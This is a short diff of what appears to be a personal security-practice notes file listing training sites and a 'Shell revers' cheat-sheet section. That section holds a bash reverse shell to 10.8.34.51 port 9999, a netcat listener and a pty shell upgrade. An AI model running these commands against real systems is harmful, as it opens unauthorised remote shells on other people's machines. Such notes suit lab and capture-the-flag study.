@@ -32,17 +32,13 @@
   - [Hacker101](https://www.hacker101.com/)
   - [Codeby Games](https://codeby.games/categories)
 
-<<<<<<< HEAD
-# shell revers
-=======
 # Shell revers
->>>>>>> refs/remotes/origin/Main
+
   - [revshell](https://www.revshells.com/)
   - [ngrok](https://ngrok.com/)
   python -c 'import pty;pty.spawn("/bin/bash")'
   nc -lvnp 9999
   sh -i >& /dev/tcp/10.8.34.51/9999 0>&1
-
 
 
 # Search
